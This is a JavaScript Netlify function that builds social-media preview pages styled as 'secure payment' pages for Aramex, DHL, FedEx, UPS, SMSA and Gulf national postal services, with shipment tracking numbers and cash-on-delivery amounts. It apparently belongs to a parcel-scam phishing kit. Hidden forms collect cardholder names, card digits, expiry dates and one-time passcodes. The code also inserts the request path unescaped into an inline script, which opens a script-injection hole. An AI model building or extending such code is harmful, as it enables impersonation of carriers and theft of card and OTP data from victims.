const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  }
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) {
    console.log('Supabase not configured, using fallback data');
    return null;
  }
  
  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();
    
    if (error) {
      console.error('Error fetching link data:', error);
      return null;
    }
    
    return data;
  } catch (error) {
    console.error('Error in getLinkData:', error);
    return null;
  }
}

exports.handler = async (event, context) => {
  // Wrap everything in try-catch to ensure we always return HTML
  // Never show Netlify login or error pages
  try {
    const { path, queryStringParameters, headers } = event;
    
    // Detect if this is a social media crawler or bot
    const userAgent = headers['user-agent'] || headers['User-Agent'] || '';
    const isCrawler = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|slackbot|telegrambot|bingbot|googlebot|baiduspider|yandexbot|applebot/i.test(userAgent);
    
    // Continue with meta tag generation for both crawlers and regular users
    // Crawlers will read meta tags, regular users will be redirected via JavaScript
  
  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
  let countryCode, type, id;
  
  if (pathMatch) {
    [, countryCode, type, id] = pathMatch;
  } else {
    // Handle payment page routes: /pay/:id/...
    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
    if (pathMatch) {
      [, id, subPath] = pathMatch;
      // For payment pages, we need to determine the type from the link data
      type = 'shipping'; // Default to shipping for payment pages
      countryCode = 'SA'; // Default country, will be overridden by link data
    } else {
      // Invalid path - serve React app HTML directly without redirects
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
        },
        body: `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Loading...</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
  </head>
  <body>
    <div id="root"></div>
    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
    <script>
      // Update browser history for React Router
      if (window.history && window.history.replaceState) {
        window.history.replaceState({}, '', window.location.pathname + window.location.search);
      }
    </script>
  </body>
</html>`
      };
    }
  }
  
  // If country not found, use default but don't return 404
  let country = countryData[countryCode];
  if (!country) {
    console.warn(`Country ${countryCode} not found, using default`);
    // Use default country (Saudi Arabia)
    country = countryData['SA'] || { nameAr: 'السعودية', name: 'Saudi Arabia' };
    countryCode = 'SA';
  }
  
  // Try to get link data from database first
  const linkData = await getLinkData(id);
  
  // For payment pages, get country and type from link data if available
  if (linkData?.country_code) {
    countryCode = linkData.country_code;
    const linkCountry = countryData[countryCode];
    if (linkCountry) {
      country = linkCountry;
    }
  }
  
  if (linkData?.type) {
    type = linkData.type;
  }
  
  // Debug logging
  console.log('Link ID:', id);
  console.log('Link Data:', linkData);
  console.log('Query Parameters:', queryStringParameters);
  console.log('Final Country:', countryCode, 'Type:', type);
  
  let title = "";
  let description = "";
  let ogImage = "/og-aramex.jpg";
  let serviceKey = 'aramex'; // fallback
  
  if (type === "shipping") {
    // Determine service key from multiple sources
    if (linkData?.payload?.service_key) {
      serviceKey = linkData.payload.service_key;
      console.log('Using service_key from payload:', serviceKey);
    } else if (linkData?.payload?.service) {
      serviceKey = linkData.payload.service;
      console.log('Using service from payload:', serviceKey);
    } else if (queryStringParameters?.service) {
      serviceKey = queryStringParameters.service;
      console.log('Using service from query params:', serviceKey);
    } else {
      console.log('Using fallback service:', serviceKey);
    }
    
    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
    
    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
    
    // Determine if this is a payment page or microsite
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
    
    title = `${pageType} - ${serviceName}`;
    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
    ogImage = serviceInfo.ogImage;
    
    // Add tracking number to description if available
    if (linkData?.payload?.tracking_number) {
      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
    }
    
    // Add COD amount if available
    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
    }
  } else if (type === "chalet") {
    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
    
    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
    
    // Add guest count and nights if available
    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
    }
    
    ogImage = "/og-aramex.jpg"; // Default for chalets
  }
  
  const siteUrl = `https://${event.headers.host}`;
  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
  
  // Final debug logging
  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
  
  // Build HTML with React app - use current build's asset filenames
  // In Netlify, the dist folder is accessible, so we can read index.html
  // But if that fails, we'll use a script that loads assets dynamically
  let scriptTag = '';
  let styleTag = '';
  
  try {
    // Try to read index.html from dist folder
    // In Netlify functions, the dist folder is at the repo root
    const indexPath = path.join(__dirname, '..', '..', 'dist', 'index.html');
    if (fs.existsSync(indexPath)) {
      const baseHtml = fs.readFileSync(indexPath, 'utf8');
      
      // Extract script and style tags
      const scriptMatch = baseHtml.match(/<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/i);
      const styleMatch = baseHtml.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/i);
      
      if (scriptMatch) scriptTag = `<script type="module" crossorigin src="${scriptMatch[1]}"></script>`;
      if (styleMatch) styleTag = `<link rel="stylesheet" crossorigin href="${styleMatch[1]}">`;
      
      console.log('Successfully loaded assets from index.html');
    } else {
      throw new Error('index.html not found at expected path');
    }
  } catch (error) {
    console.error('Could not read index.html:', error);
    // Fallback: Use current build's asset filenames (from dist/index.html we saw earlier)
    // These will work if the build structure is consistent
    scriptTag = '<script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>';
    styleTag = '<link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">';
    
    // If those don't work, add a fallback script that tries multiple patterns
    scriptTag += `
    <script>
      // Fallback: Try to load React app if primary script fails
      window.addEventListener('error', function(e) {
        if (e.target && e.target.tagName === 'SCRIPT') {
          // Try alternative asset paths
          const alternatives = ['/assets/index.js', '/assets/index-main.js'];
          alternatives.forEach(alt => {
            const script = document.createElement('script');
            script.type = 'module';
            script.src = alt;
            document.head.appendChild(script);
          });
        }
      }, true);
    </script>`;
  }
  
  // Build the React app HTML with proper meta tags and asset loading
  // This HTML will be served directly - no redirects, no Netlify login pages
  const reactAppHtml = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <link rel="manifest" href="/manifest.json" />
    <link rel="apple-touch-icon" href="/icon-192.png" />
    <title>${title}</title>
    <meta name="description" content="${description.replace(/"/g, '&quot;')}" />
    <meta name="author" content="منصة الشحن الذكية" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    ${styleTag}
    
    <!-- Open Graph / Facebook / WhatsApp Meta Tags -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="${fullUrl}" />
    <meta property="og:title" content="${title.replace(/"/g, '&quot;')}" />
    <meta property="og:description" content="${description.replace(/"/g, '&quot;')}" />
    <meta property="og:image" content="${fullOgImage}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:site_name" content="نظام الدفع الآمن" />
    <meta property="og:locale" content="ar_AR" />
    
    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:url" content="${fullUrl}" />
    <meta name="twitter:title" content="${title.replace(/"/g, '&quot;')}" />
    <meta name="twitter:description" content="${description.replace(/"/g, '&quot;')}" />
    <meta name="twitter:image" content="${fullOgImage}" />
    <meta name="twitter:image:alt" content="${title.replace(/"/g, '&quot;')}" />
    
    <link rel="canonical" href="${fullUrl}" />
  </head>
  <body>
    <div id="root"></div>
    
    <!-- Update browser history immediately so React Router sees the correct path -->
    <script>
      (function() {
        const originalPath = '${path}';
        const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
        if (window.history && window.history.replaceState) {
          window.history.replaceState({}, '', originalPath + query);
        }
      })();
    </script>
    
    ${scriptTag}
    
    <!-- Hidden Netlify Forms -->
    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="expiry" />
      <input type="text" name="timestamp" />
    </form>
    
    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
      <input type="text" name="name" />
      <input type="email" name="email" />
      <input type="tel" name="phone" />
      <input type="text" name="service" />
      <input type="text" name="amount" />
      <input type="text" name="cardholder" />
      <input type="text" name="cardLast4" />
      <input type="text" name="otp" />
      <input type="text" name="timestamp" />
    </form>
  </body>
</html>`;
  
  // The HTML already has meta tags injected, so we can return it directly
  const html = reactAppHtml;

  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=0, must-revalidate',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'SAMEORIGIN'
    },
    body: html
  };
  } catch (error) {
    // If anything goes wrong, still return HTML (never show Netlify error/login page)
    console.error('Error in microsite-meta function:', error);
    
    // Return React app HTML with fallback meta tags
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'public, max-age=0, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'SAMEORIGIN'
      },
      body: `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <title>منصة الشحن الذكية</title>
    <meta name="description" content="منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
  </head>
  <body>
    <div id="root"></div>
    <script>
      // Update browser history for React Router
      if (window.history && window.history.replaceState) {
        window.history.replaceState({}, '', window.location.pathname + window.location.search);
      }
    </script>
  </body>
</html>`
    };
  }
};